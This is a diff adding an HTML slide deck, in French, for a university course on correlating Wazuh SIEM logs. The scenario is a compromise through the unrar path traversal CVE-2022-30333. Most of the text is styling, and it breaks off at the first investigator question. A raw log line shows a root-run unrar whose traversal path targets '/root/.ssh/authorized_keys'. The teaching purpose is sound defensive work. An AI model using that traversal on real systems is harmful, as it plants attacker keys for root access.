@@ -1,0 +1,1423 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Corrélation de Logs — Scénario de Compromission</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #020b10;
+    --panel: #040f18;
+    --border: #0d3a4a;
+    --green: #00ff9d;
+    --cyan: #00d4ff;
+    --red: #ff3c5a;
+    --yellow: #ffd700;
+    --orange: #ff8c00;
+    --text: #8ab8c8;
+    --dim: #3a5a6a;
+    --font-mono: 'Share Tech Mono', monospace;
+    --font-display: 'Orbitron', sans-serif;
+    --font-body: 'Rajdhani', sans-serif;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font-body);
+    overflow: hidden;
+    height: 100vh;
+    width: 100vw;
+  }
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.07) 2px, rgba(0,0,0,0.07) 4px);
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* ─── SLIDE SYSTEM ─── */
+  .slide { position: absolute; inset: 0; display: none; opacity: 0; transition: opacity 0.4s ease; }
+  .slide.active { display: flex; flex-direction: column; }
+  .slide.visible { opacity: 1; }
+
+  /* ─── TOPBAR ─── */
+  .topbar {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 10px 24px; border-bottom: 1px solid var(--border);
+    background: rgba(4,15,24,0.95); flex-shrink: 0;
+  }
+  .topbar-left { display: flex; align-items: center; gap: 16px; }
+  .logo { font-family: var(--font-display); font-size: 11px; color: var(--cyan); letter-spacing: 3px; text-transform: uppercase; }
+  .tlp { background: #8b0000; color: #fff; font-family: var(--font-mono); font-size: 10px; padding: 2px 8px; border-radius: 2px; letter-spacing: 2px; }
+  .topbar-right { font-family: var(--font-mono); font-size: 10px; color: var(--dim); display: flex; gap: 20px; }
+  .topbar-right span { color: var(--text); }
+
+  /* ─── NAV DOTS ─── */
+  .slide-nav { position: fixed; bottom: 16px; left: 50%; transform: translateX(-50%); display: flex; gap: 8px; z-index: 100; }
+  .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--dim); cursor: pointer; transition: all 0.3s; }
+  .dot.active { background: var(--cyan); box-shadow: 0 0 8px var(--cyan); }
+  .nav-hint { position: fixed; bottom: 16px; right: 24px; font-family: var(--font-mono); font-size: 10px; color: var(--dim); z-index: 100; }
+
+  /* ══════════════════════════════════════════
+     SLIDE 0 — TITRE (BRIGHT + DARK MODE)
+  ══════════════════════════════════════════ */
+  #slide-0 { background: #fff; }
+
+  /* ── BRIGHT MODE ── */
+  .title-bright {
+    position: absolute; inset: 0;
+    display: flex; flex-direction: column;
+    justify-content: center; align-items: center;
+    background: #ffffff;
+    overflow: hidden;
+    z-index: 2;
+    transition: opacity 0.7s ease;
+  }
+  .blob {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(80px);
+    opacity: 0.35;
+    animation: floatBlob 6s ease-in-out infinite alternate;
+  }
+  .blob-1 { width: 420px; height: 420px; background: radial-gradient(circle, #ff006e, #fb5607); top: -100px; left: -80px; animation-delay: 0s; }
+  .blob-2 { width: 350px; height: 350px; background: radial-gradient(circle, #3a86ff, #8338ec); top: 60px; right: -60px; animation-delay: -2s; }
+  .blob-3 { width: 300px; height: 300px; background: radial-gradient(circle, #06d6a0, #118ab2); bottom: -80px; left: 30%; animation-delay: -4s; }
+  .blob-4 { width: 200px; height: 200px; background: radial-gradient(circle, #ffbe0b, #fb5607); bottom: 40px; right: 100px; animation-delay: -1s; }
+  @keyframes floatBlob { from { transform: translate(0,0) scale(1); } to { transform: translate(30px, 20px) scale(1.1); } }
+
+  .bright-content { position: relative; z-index: 1; text-align: center; padding: 0 40px; }
+  .bright-eyebrow {
+    font-family: var(--font-display);
+    font-size: 11px; letter-spacing: 5px;
+    text-transform: uppercase;
+    color: #8338ec;
+    margin-bottom: 16px;
+    background: rgba(131,56,236,0.1);
+    border: 1px solid rgba(131,56,236,0.3);
+    display: inline-block; padding: 4px 14px; border-radius: 2px;
+  }
+  .bright-title {
+    font-family: var(--font-display);
+    font-size: 52px; font-weight: 900;
+    line-height: 1.05; letter-spacing: 1px;
+    margin-bottom: 12px;
+  }
+  .bright-title span:nth-child(1) { color: #ff006e; }
+  .bright-title span:nth-child(2) { color: #3a86ff; }
+  .bright-title span:nth-child(3) { color: #8338ec; }
+  .bright-subtitle {
+    font-family: var(--font-body);
+    font-size: 18px; font-weight: 600;
+    color: #444; letter-spacing: 3px;
+    text-transform: uppercase; margin-bottom: 12px;
+  }
+  .bright-univ {
+    font-family: var(--font-mono);
+    font-size: 11px; color: #888;
+    letter-spacing: 2px; margin-bottom: 40px;
+  }
+  .bright-meta {
+    display: flex; justify-content: center; gap: 24px;
+    margin-bottom: 44px; flex-wrap: wrap;
+  }
+  .bm-item {
+    background: #f8f9ff;
+    border: 1px solid #e0e4ff;
+    border-radius: 4px;
+    padding: 8px 18px; text-align: center;
+  }
+  .bm-label { font-family: var(--font-mono); font-size: 9px; color: #999; letter-spacing: 2px; display: block; margin-bottom: 3px; }
+  .bm-val { font-family: var(--font-display); font-size: 12px; font-weight: 700; color: #222; }
+  .bm-val.red   { color: #ff006e; }
+  .bm-val.blue  { color: #3a86ff; }
+  .bm-val.purp  { color: #8338ec; }
+  .bm-val.grn   { color: #06d6a0; }
+
+  /* ── THE BIG BUTTON ── */
+  .launch-btn {
+    position: relative;
+    display: inline-flex; align-items: center; gap: 12px;
+    padding: 18px 44px;
+    font-family: var(--font-display);
+    font-size: 14px; font-weight: 900;
+    letter-spacing: 3px; text-transform: uppercase;
+    color: #fff; cursor: pointer; border: none;
+    border-radius: 4px;
+    background: linear-gradient(135deg, #ff006e, #8338ec, #3a86ff);
+    background-size: 200% 200%;
+    animation: gradAnim 3s ease infinite;
+    box-shadow: 0 8px 32px rgba(131,56,236,0.4), 0 0 0 0 rgba(255,0,110,0.4);
+    transition: transform 0.15s, box-shadow 0.15s;
+  }
+  .launch-btn:hover { transform: scale(1.04); box-shadow: 0 12px 40px rgba(131,56,236,0.6), 0 0 0 4px rgba(255,0,110,0.2); }
+  .launch-btn:active { transform: scale(0.97); }
+  @keyframes gradAnim {
+    0%   { background-position: 0% 50%; }
+    50%  { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+  }
+  .btn-icon { font-size: 20px; animation: pulseIcon 1.5s ease-in-out infinite; }
+  @keyframes pulseIcon { 0%,100%{transform:scale(1);} 50%{transform:scale(1.3) rotate(-10deg);} }
+  .btn-ripple {
+    position: absolute; inset: 0; border-radius: 4px;
+    background: inherit; opacity: 0;
+    animation: ripple 2s ease-out infinite;
+  }
+  @keyframes ripple { 0%{transform:scale(1);opacity:0.4;} 100%{transform:scale(1.15);opacity:0;} }
+
+  /* ── DARK MODE TITLE ── */
+  .title-dark {
+    position: absolute; inset: 0;
+    display: flex; flex-direction: column;
+    justify-content: center; align-items: center;
+    background: radial-gradient(ellipse at 20% 50%, rgba(0,212,255,0.04) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 20%, rgba(0,255,157,0.03) 0%, transparent 50%),
+                var(--bg);
+    z-index: 1;
+    opacity: 0; pointer-events: none;
+    transition: opacity 0.8s ease;
+  }
+  .title-dark.show { opacity: 1; pointer-events: all; }
+  .grid-bg {
+    position: absolute; inset: 0;
+    background-image: linear-gradient(rgba(13,58,74,0.4) 1px, transparent 1px), linear-gradient(90deg, rgba(13,58,74,0.4) 1px, transparent 1px);
+    background-size: 40px 40px;
+  }
+  .title-content { position: relative; text-align: center; z-index: 1; }
+  .title-tag { font-family: var(--font-mono); font-size: 11px; color: var(--cyan); letter-spacing: 4px; text-transform: uppercase; margin-bottom: 20px; opacity: 0.7; }
+  .title-main { font-family: var(--font-display); font-size: 42px; font-weight: 900; color: #fff; line-height: 1.1; letter-spacing: 2px; text-shadow: 0 0 40px rgba(0,212,255,0.3); margin-bottom: 8px; }
+  .title-sub { font-family: var(--font-display); font-size: 16px; color: var(--cyan); letter-spacing: 6px; margin-bottom: 40px; }
+  .title-meta { display: flex; justify-content: center; gap: 40px; font-family: var(--font-mono); font-size: 11px; }
+  .meta-item { text-align: center; }
+  .meta-label { color: var(--dim); display: block; }
+  .meta-value { color: var(--green); }
+  .cve-badge {
+    margin-top: 32px; display: inline-block;
+    border: 1px solid var(--red); padding: 6px 20px;
+    font-family: var(--font-mono); font-size: 13px; color: var(--red);
+    letter-spacing: 2px; text-shadow: 0 0 10px rgba(255,60,90,0.5);
+    box-shadow: 0 0 20px rgba(255,60,90,0.1);
+  }
+  .dark-start-btn {
+    margin-top: 36px;
+    display: inline-flex; align-items: center; gap: 10px;
+    padding: 12px 32px;
+    font-family: var(--font-display); font-size: 12px;
+    letter-spacing: 3px; text-transform: uppercase;
+    color: var(--bg); background: var(--cyan);
+    border: none; cursor: pointer;
+    box-shadow: 0 0 20px rgba(0,212,255,0.4);
+    transition: all 0.2s;
+  }
+  .dark-start-btn:hover { background: var(--green); box-shadow: 0 0 30px rgba(0,255,157,0.5); transform: scale(1.04); }
+
+  /* ══════════════════════════════════════════
+     SLIDE 1 — PREMIER INDICE (new)
+  ══════════════════════════════════════════ */
+  #slide-1 { background: var(--bg); }
+  .alert-spotlight {
+    flex: 1; display: grid;
+    grid-template-columns: 1fr 1fr;
+    overflow: hidden;
+  }
+  .indice-left {
+    border-right: 1px solid var(--border);
+    display: flex; flex-direction: column;
+    background: #020a0e;
+  }
+  .indice-right {
+    display: flex; flex-direction: column;
+    background: #030d12;
+    padding: 0;
+  }
+
+  /* Wazuh-style alert card */
+  .wazuh-alert-box {
+    margin: 20px;
+    border: 1px solid rgba(255,215,0,0.3);
+    background: rgba(255,215,0,0.03);
+    border-radius: 3px;
+    overflow: hidden;
+  }
+  .wazuh-alert-header {
+    background: rgba(255,215,0,0.1);
+    padding: 10px 14px;
+    display: flex; align-items: center; gap: 10px;
+    border-bottom: 1px solid rgba(255,215,0,0.2);
+  }
+  .wazuh-alert-title { font-family: var(--font-display); font-size: 10px; letter-spacing: 2px; color: var(--yellow); }
+  .wazuh-alert-id { margin-left: auto; font-family: var(--font-mono); font-size: 9px; color: var(--dim); }
+  .wazuh-field { display: flex; justify-content: space-between; padding: 6px 14px; border-bottom: 1px solid rgba(13,58,74,0.4); font-family: var(--font-mono); font-size: 10px; }
+  .wazuh-field:last-child { border-bottom: none; }
+  .wf-key { color: var(--dim); }
+  .wf-val { color: var(--text); text-align: right; max-width: 60%; word-break: break-all; }
+  .wf-val.red { color: var(--red); }
+  .wf-val.yellow { color: var(--yellow); }
+  .wf-val.cyan { color: var(--cyan); }
+  .wf-val.orange { color: var(--orange); }
+
+  .raw-log-box {
+    margin: 0 20px 20px;
+    border: 1px solid rgba(0,212,255,0.15);
+    background: #010810;
+    border-radius: 2px;
+    padding: 12px 14px;
+    font-family: var(--font-mono);
+    font-size: 10px;
+    line-height: 1.8;
+    color: var(--dim);
+  }
+  .raw-log-box .hl { color: var(--red); font-weight: bold; }
+  .raw-log-box .hl-y { color: var(--yellow); }
+  .raw-log-box .hl-c { color: var(--cyan); }
+  .raw-log-title {
+    font-family: var(--font-display); font-size: 9px;
+    letter-spacing: 2px; color: var(--dim); margin: 0 20px 6px;
+    padding-top: 4px;
+  }
+
+  /* Investigation notes panel */
+  .invest-header {
+    padding: 10px 20px;
+    border-bottom: 1px solid var(--border);
+    background: rgba(0,212,255,0.03);
+  }
+  .invest-title { font-family: var(--font-display); font-size: 10px; letter-spacing: 3px; color: var(--cyan); }
+  .invest-body { flex: 1; padding: 16px 20px; overflow-y: auto; }
+
+  .question-card {
+    border-left: 3px solid var(--yellow);
+    background: rgba(255,215,0,0.03);
+    padding: 10px 14px;
+    margin-bottom: 12px;
+    opacity: 0; transform: translateX(20px);
+    transition: all 0.4s ease;
+    font-family: var(--font-mono);
+    font-size: 11px;
+  }
+  .question-card.shown { opacity: 1; transform: translateX(0); }
+  .qc-label { font-size: 9px; color: var(--dim); letter-spacing: 2px; margin-bottom: 4px; }
+  .qc-text { color: var(--text); line-height: 1.5; }
+  .qc-text .hi { color: var(--yellow); }
+  .qc-text .hiR { color: var(--red); }
+  .qc-text .hiG { color: var(--green); }
+  .qc-text .hiC { color: var(--cyan); }
+
+  .finding-card {
+    border-left: 3px solid var(--cyan);
+    background: rgba(0,212,255,0.03);
+    padding: 10px 14px;
+    margin-bottom: 12px;
+    opacity: 0; transform: translateX(20px);
+    transition: all 0.4s ease;
+    font-family: var(--font-mono);
+    font-size: 11px;
+  }
+  .finding-card.shown { opacity: 1; transform: translateX(0); }
+
+  /* ══════════════════════════════════════════
+     SPLIT LAYOUT (slides 2–7)
+  ══════════════════════════════════════════ */
+  .split-layout { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 0; overflow: hidden; min-height: 0; }
+  .panel { display: flex; flex-direction: column; overflow: hidden; border-right: 1px solid var(--border); }
+  .panel:last-child { border-right: none; }
+  .panel-header {
+    padding: 8px 16px; border-bottom: 1px solid var(--border);
+    display: flex; align-items: center; gap: 10px;
+    background: rgba(4,15,24,0.8); flex-shrink: 0;
+  }
+  .panel-dot { width: 8px; height: 8px; border-radius: 50%; }
+  .panel-title { font-family: var(--font-display); font-size: 9px; letter-spacing: 3px; text-transform: uppercase; color: var(--dim); }
+  .panel-badge { margin-left: auto; font-family: var(--font-mono); font-size: 9px; padding: 2px 8px; border-radius: 2px; }
+  .badge-ok   { background: rgba(0,255,157,0.1); color: var(--green); border: 1px solid rgba(0,255,157,0.2); }
+  .badge-warn { background: rgba(255,215,0,0.1); color: var(--yellow); border: 1px solid rgba(255,215,0,0.2); }
+  .badge-crit { background: rgba(255,60,90,0.1); color: var(--red); border: 1px solid rgba(255,60,90,0.2); }
+  .log-scroll {
+    flex: 1; overflow-y: auto; padding: 10px 0;
+    font-family: var(--font-mono); font-size: 11px; line-height: 1.8;
+    background: rgba(2,11,16,0.5);
+    scrollbar-width: thin; scrollbar-color: var(--border) transparent;
+  }
+  .log-entry {
+    display: flex; gap: 10px; padding: 2px 16px;
+    opacity: 0; transform: translateX(-10px);
+    transition: all 0.3s ease; border-left: 2px solid transparent;
+  }
+  .log-entry.shown { opacity: 1; transform: translateX(0); }
+  .log-entry.highlight { border-left-color: var(--cyan); background: rgba(0,212,255,0.04); }
+  .log-entry.alert     { border-left-color: var(--red);  background: rgba(255,60,90,0.05); }
+  .log-entry.warn      { border-left-color: var(--yellow); background: rgba(255,215,0,0.04); }
+  .log-time   { color: var(--dim); white-space: nowrap; flex-shrink: 0; }
+  .log-source { color: var(--orange); flex-shrink: 0; min-width: 60px; }
+  .log-msg    { color: var(--text); flex: 1; }
+  .log-rule   { color: var(--cyan); margin-left: auto; white-space: nowrap; flex-shrink: 0; }
+  .hl-ip    { color: var(--yellow); }
+  .hl-cmd   { color: var(--green); }
+  .hl-path  { color: var(--cyan); }
+  .hl-user  { color: #e091ff; }
+  .hl-alert { color: var(--red); font-weight: bold; }
+  .terminal-body {
+    flex: 1; overflow-y: auto; padding: 14px 16px;
+    font-family: var(--font-mono); font-size: 12px; line-height: 1.7;
+    background: #010a0f;
+    scrollbar-width: thin; scrollbar-color: var(--border) transparent;
+  }
+  .t-prompt      { color: var(--green); }
+  .t-prompt-root { color: var(--red); }
+  .t-cmd         { color: #fff; }
+  .t-output      { color: var(--dim); }
+  .t-output-hi   { color: var(--text); }
+  .t-output-warn { color: var(--yellow); }
+  .t-output-success { color: var(--green); }
+  .t-output-error   { color: var(--red); }
+  .t-output-cred    { color: #ff8c00; }
+  .cursor      { display: inline-block; width: 8px; height: 14px; background: var(--green); animation: blink 1s infinite; vertical-align: middle; }
+  .cursor-root { background: var(--red); }
+  @keyframes blink { 0%,49%{opacity:1} 50%,100%{opacity:0} }
+
+  /* ── STEP BAR ── */
+  .step-bar {
+    padding: 8px 20px; border-bottom: 1px solid var(--border);
+    display: flex; align-items: center; gap: 14px;
+    background: rgba(4,15,24,0.95); flex-shrink: 0;
+  }
+  .step-num   { font-family: var(--font-display); font-size: 9px; color: var(--dim); letter-spacing: 2px; }
+  .step-name  { font-family: var(--font-display); font-size: 13px; font-weight: 700; color: #fff; letter-spacing: 1px; }
+  .step-mitre { margin-left: auto; font-family: var(--font-mono); font-size: 10px; color: var(--cyan); background: rgba(0,212,255,0.07); border: 1px solid rgba(0,212,255,0.2); padding: 2px 8px; border-radius: 2px; }
+  .step-time  { font-family: var(--font-mono); font-size: 10px; color: var(--yellow); padding: 2px 8px; background: rgba(255,215,0,0.05); border: 1px solid rgba(255,215,0,0.15); border-radius: 2px; }
+
+  /* ══════════════════════════════════════════
+     TIMELINE
+  ══════════════════════════════════════════ */
+  #slide-8 { background: var(--bg); flex-direction: column; }
+  .timeline-body { flex: 1; overflow-y: auto; padding: 20px 30px; scrollbar-width: thin; scrollbar-color: var(--border) transparent; }
+  .timeline-grid { display: grid; grid-template-columns: 90px 20px 1fr; gap: 0; }
+  .tl-time { font-family: var(--font-mono); font-size: 10px; color: var(--yellow); text-align: right; padding: 6px 10px 6px 0; line-height: 1.3; }
+  .tl-line-container { display: flex; flex-direction: column; align-items: center; }
+  .tl-dot { width: 10px; height: 10px; border-radius: 50%; margin-top: 8px; flex-shrink: 0; box-shadow: 0 0 8px currentColor; }
+  .tl-vline { width: 1px; flex: 1; min-height: 8px; background: var(--border); }
+  .tl-content { padding: 4px 0 16px 14px; opacity: 0; transform: translateX(15px); transition: all 0.4s ease; }
+  .tl-content.shown { opacity: 1; transform: translateX(0); }
+  .tl-phase { font-family: var(--font-mono); font-size: 9px; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 2px; }
+  .tl-event  { font-family: var(--font-body); font-size: 13px; font-weight: 600; color: #fff; margin-bottom: 2px; }
+  .tl-detail { font-family: var(--font-mono); font-size: 10px; color: var(--dim); }
+  .phase-init    { color: var(--cyan); }
+  .phase-persist { color: var(--green); }
+  .phase-recon   { color: var(--yellow); }
+  .phase-exfil   { color: var(--orange); }
+  .phase-privesc { color: var(--red); }
+  .phase-backdoor{ color: #ff00ff; }
+
+  /* ══════════════════════════════════════════
+     IOC SLIDE
+  ══════════════════════════════════════════ */
+  .ioc-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 16px; padding: 20px; flex: 1; overflow-y: auto; }
+  .ioc-card { border: 1px solid var(--border); background: var(--panel); padding: 16px; border-radius: 2px; opacity: 0; transform: translateY(10px); transition: all 0.4s ease; }
+  .ioc-card.shown { opacity: 1; transform: translateY(0); }
+  .ioc-card-title { font-family: var(--font-display); font-size: 9px; letter-spacing: 3px; color: var(--dim); margin-bottom: 12px; text-transform: uppercase; }
+  .ioc-item { font-family: var(--font-mono); font-size: 11px; color: var(--text); padding: 4px 0; border-bottom: 1px solid rgba(13,58,74,0.5); display: flex; justify-content: space-between; align-items: center; gap: 8px; }
+  .ioc-item:last-child { border-bottom: none; }
+  .ioc-tag { font-size: 8px; padding: 1px 5px; border-radius: 2px; flex-shrink: 0; }
+  .tag-high { background: rgba(255,60,90,0.15); color: var(--red); border: 1px solid rgba(255,60,90,0.3); }
+  .tag-med  { background: rgba(255,215,0,0.1);  color: var(--yellow); border: 1px solid rgba(255,215,0,0.3); }
+  .tag-low  { background: rgba(0,212,255,0.07); color: var(--cyan); border: 1px solid rgba(0,212,255,0.2); }
+
+  /* ══════════════════════════════════════════
+     SLIDE 10 — CVE ROOT CAUSE (new)
+  ══════════════════════════════════════════ */
+  #slide-10 { background: var(--bg); }
+  .cve-body { flex: 1; overflow-y: auto; padding: 20px 28px; display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+
+  .cve-card {
+    border: 1px solid var(--border);
+    background: var(--panel);
+    border-radius: 3px; overflow: hidden;
+    opacity: 0; transform: translateY(12px);
+    transition: all 0.5s ease;
+  }
+  .cve-card.shown { opacity: 1; transform: translateY(0); }
+  .cve-card-head {
+    padding: 8px 14px; border-bottom: 1px solid var(--border);
+    font-family: var(--font-display); font-size: 9px;
+    letter-spacing: 3px; text-transform: uppercase;
+  }
+  .cve-card-head.red    { color: var(--red); background: rgba(255,60,90,0.05); }
+  .cve-card-head.yellow { color: var(--yellow); background: rgba(255,215,0,0.04); }
+  .cve-card-head.cyan   { color: var(--cyan); background: rgba(0,212,255,0.04); }
+  .cve-card-head.green  { color: var(--green); background: rgba(0,255,157,0.04); }
+  .cve-card-body { padding: 14px; font-family: var(--font-mono); font-size: 10px; line-height: 1.8; color: var(--text); }
+
+  .cve-row { display: flex; justify-content: space-between; border-bottom: 1px solid rgba(13,58,74,0.5); padding: 5px 0; }
+  .cve-row:last-child { border-bottom: none; }
+  .cve-key { color: var(--dim); }
+  .cve-val { text-align: right; }
+  .cve-val.red    { color: var(--red); }
+  .cve-val.yellow { color: var(--yellow); }
+  .cve-val.green  { color: var(--green); }
+  .cve-val.cyan   { color: var(--cyan); }
+
+  .traversal-demo {
+    font-family: var(--font-mono); font-size: 10px; line-height: 2;
+    background: #010810; padding: 12px; border-radius: 2px;
+    border: 1px solid rgba(255,60,90,0.2);
+  }
+  .td-line { color: var(--dim); }
+  .td-line.bad  { color: var(--red); }
+  .td-line.warn { color: var(--yellow); }
+  .td-line.ok   { color: var(--green); }
+
+  .ver-table { width: 100%; border-collapse: collapse; font-family: var(--font-mono); font-size: 10px; }
+  .ver-table th { padding: 4px 8px; border-bottom: 1px solid var(--border); color: var(--dim); font-weight: normal; text-align: left; }
+  .ver-table td { padding: 5px 8px; border-bottom: 1px solid rgba(13,58,74,0.3); }
+  .ver-table tr.vulnerable td { background: rgba(255,60,90,0.05); color: var(--red); }
+  .ver-table tr.patched td    { background: rgba(0,255,157,0.05); color: var(--green); }
+  .ver-table tr.this-attack td { background: rgba(255,215,0,0.08); color: var(--yellow); font-weight: bold; }
+
+  .remediation-list { list-style: none; }
+  .remediation-list li { padding: 5px 0; border-bottom: 1px solid rgba(13,58,74,0.4); display: flex; gap: 10px; align-items: flex-start; }
+  .remediation-list li:last-child { border-bottom: none; }
+  .rem-icon { flex-shrink: 0; font-size: 12px; }
+  .rem-text { color: var(--text); }
+  .rem-text .hi { color: var(--green); }
+
+  .cvss-bar-wrap { margin-top: 6px; }
+  .cvss-label { display: flex; justify-content: space-between; margin-bottom: 4px; }
+  .cvss-bar-bg { height: 8px; background: rgba(255,255,255,0.05); border-radius: 4px; overflow: hidden; }
+  .cvss-bar-fill { height: 100%; border-radius: 4px; transition: width 1.2s ease; }
+  .cvss-bar-fill.red    { background: linear-gradient(90deg, var(--red), #ff6b6b); }
+  .cvss-bar-fill.yellow { background: linear-gradient(90deg, var(--yellow), var(--orange)); }
+  .cvss-bar-fill.green  { background: linear-gradient(90deg, var(--green), var(--cyan)); }
+
+  /* Lesson box spanning full width */
+  .lesson-box {
+    grid-column: 1 / -1;
+    border: 1px solid rgba(255,60,90,0.4);
+    background: rgba(255,60,90,0.04);
+    border-radius: 3px; padding: 14px 20px;
+    display: flex; gap: 20px; align-items: center;
+    opacity: 0; transform: translateY(12px);
+    transition: all 0.5s ease;
+  }
+  .lesson-box.shown { opacity: 1; transform: translateY(0); }
+  .lesson-icon { font-size: 32px; flex-shrink: 0; }
+  .lesson-text { font-family: var(--font-body); font-size: 15px; line-height: 1.6; }
+  .lesson-text strong { color: var(--red); font-family: var(--font-display); font-size: 13px; letter-spacing: 1px; }
+</style>
+</head>
+<body>
+
+<!-- ══════════════════════════════════════════
+     SLIDE 0 — TITRE BRIGHT + DARK
+══════════════════════════════════════════ -->
+<div class="slide" id="slide-0">
+
+  <!-- BRIGHT MODE -->
+  <div class="title-bright" id="title-bright">
+    <div class="blob blob-1"></div>
+    <div class="blob blob-2"></div>
+    <div class="blob blob-3"></div>
+    <div class="blob blob-4"></div>
+    <div class="bright-content">
+      <div class="bright-eyebrow">Université Mohammed V — Master CITE</div>
+      <div class="bright-title">
+        <span>CORRÉLATION</span> <span>DE</span><br><span>LOGS</span>
+      </div>
+      <div class="bright-subtitle">Scénario de Compromission</div>
+      <div class="bright-univ">Wazuh SIEM &nbsp;·&nbsp; Ubuntu Azure VM &nbsp;·&nbsp; CVE-2022-30333</div>
+      <div class="bright-meta">
+        <div class="bm-item"><span class="bm-label">CVE EXPLOITÉE</span><span class="bm-val red">CVE-2022-30333</span></div>
+        <div class="bm-item"><span class="bm-label">VECTEUR</span><span class="bm-val blue">Path Traversal / unrar</span></div>
+        <div class="bm-item"><span class="bm-label">DURÉE</span><span class="bm-val purp">~1h41m</span></div>
+        <div class="bm-item"><span class="bm-label">PHASES</span><span class="bm-val grn">11 étapes</span></div>
+      </div>
+      <button class="launch-btn" id="launch-btn" onclick="launchInvestigation()">
+        <div class="btn-ripple"></div>
+        <span class="btn-icon">⚡</span>
+        LANCER L'ENQUÊTE
+      </button>
+    </div>
+  </div>
+
+  <!-- DARK MODE (revealed after button) -->
+  <div class="title-dark" id="title-dark">
+    <div class="grid-bg"></div>
+    <div class="title-content">
+      <div class="title-tag">Université Mohammed V — Master CITE</div>
+      <div class="title-main">CORRÉLATION DE LOGS</div>
+      <div class="title-sub">SCÉNARIO DE COMPROMISSION</div>
+      <div class="title-meta">
+        <div class="meta-item"><span class="meta-label">CVE EXPLOITÉE</span><span class="meta-value">CVE-2022-30333</span></div>
+        <div class="meta-item"><span class="meta-label">VECTEUR INITIAL</span><span class="meta-value">Path Traversal / Zip Slip</span></div>
+        <div class="meta-item"><span class="meta-label">DURÉE ATTAQUE</span><span class="meta-value">~1h41m</span></div>
+        <div class="meta-item"><span class="meta-label">ÉTAPES</span><span class="meta-value">11 phases</span></div>
+      </div>
+      <div class="cve-badge">MITRE ATT&amp;CK — T1190 · T1059 · T1078 · T1548 · T1098</div>
+      <br>
+      <button class="dark-start-btn" onclick="goTo(1)">COMMENCER L'INVESTIGATION →</button>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     SLIDE 1 — PREMIER INDICE (new)
+══════════════════════════════════════════ -->
+<div class="slide" id="slide-1">
+  <div class="topbar">
+    <div class="topbar-left"><span class="logo">Wazuh SIEM</span><span class="tlp">TLP:RED</span></div>
+    <div class="topbar-right"><span>ENQUÊTEUR <span>Analyse initiale</span></span><span>HEURE <span>20:36:53</span></span><span>ALERTE <span class="hl-alert">UPLOAD SUSPECT</span></span></div>
+  </div>
+  <div class="step-bar">
+    <span class="step-num">POINT D'ENTRÉE</span>
+    <span class="step-name">Premier Indice — Anomalie Détectée par les Enquêteurs</span>
+    <span class="step-time">20:36:53</span>
+    <span class="step-mitre">T1190 · Déclencheur Initial</span>
+  </div>
+  <div class="alert-spotlight">
+    <!-- LEFT: Raw Wazuh alert -->
+    <div class="indice-left">
+      <div class="panel-header">
+        <div class="panel-dot" style="background:var(--red);box-shadow:0 0 8px var(--red)"></div>
+        <span class="panel-title">Alerte Wazuh — Dashboard SIEM</span>
+        <span class="panel-badge badge-crit">ANOMALIE</span>
+      </div>
+      <div class="wazuh-alert-box">
+        <div class="wazuh-alert-header">
+          <span style="font-size:14px">⚠️</span>
+          <span class="wazuh-alert-title">UPLOAD SUSPECT — Application Web</span>
+          <span class="wazuh-alert-id">Rule #100001</span>
+        </div>
+        <div class="wazuh-field"><span class="wf-key">timestamp</span><span class="wf-val cyan">2026-05-08T20:37:11.000Z</span></div>
+        <div class="wazuh-field"><span class="wf-key">agent.name</span><span class="wf-val">ubuntu-target</span></div>
+        <div class="wazuh-field"><span class="wf-key">source.ip</span><span class="wf-val yellow">105.68.208.123</span></div>
+        <div class="wazuh-field"><span class="wf-key">user.name</span><span class="wf-val" style="color:#e091ff">stof</span></div>
+        <div class="wazuh-field"><span class="wf-key">file.name</span><span class="wf-val red">backup_data.rar</span></div>
+        <div class="wazuh-field"><span class="wf-key">event.action</span><span class="wf-val red">UPLOAD + DECOMPRESS</span></div>
+        <div class="wazuh-field"><span class="wf-key">process.name</span><span class="wf-val red">unrar</span></div>
+        <div class="wazuh-field"><span class="wf-key">process.uid</span><span class="wf-val red">0 (root) ← CRITIQUE</span></div>
+        <div class="wazuh-field"><span class="wf-key">rule.level</span><span class="wf-val red">15 / 15</span></div>
+        <div class="wazuh-field"><span class="wf-key">rule.description</span><span class="wf-val orange">Privileged command executed</span></div>
+      </div>
+      <p class="raw-log-title">RAW LOG — webapp.log</p>
+      <div class="raw-log-box">
+        <div>20:36:53 INFO <span class="hl-c">105.68.208.123</span> "POST /login HTTP/1.1" 302</div>
+        <div>20:36:53 INFO <span class="hl-c">105.68.208.123</span> "GET /upload HTTP/1.1" 200</div>
+        <div class="hl-y">20:37:11 INFO UPLOAD file=<span class="hl">backup_data.rar</span> user=stof</div>
+        <div class="hl-y">20:37:11 DECOMPRESS file=backup_data.rar <span class="hl">status=success</span></div>
+        <div class="hl">21:37:13 SYSCALL execve uid=0 euid=0 comm="unrar"</div>
+        <div class="hl">21:37:13 args: unrar -o+ -ep ../../../../root/.ssh/authorized_keys</div>
+      </div>
+    </div>
+    <!-- RIGHT: Investigator questions -->
+    <div class="indice-right">
+      <div class="invest-header">
+        <div class="invest-title">🔍 ANALYSE PRÉLIMINAIRE — QUESTIONS DES ENQUÊTEURS</div>
+      </div>
+      <div class="invest-body" id="invest-body">
+        <div class="question-card" id="qc1">
+          <div class="qc-label">QUESTION 01</div>
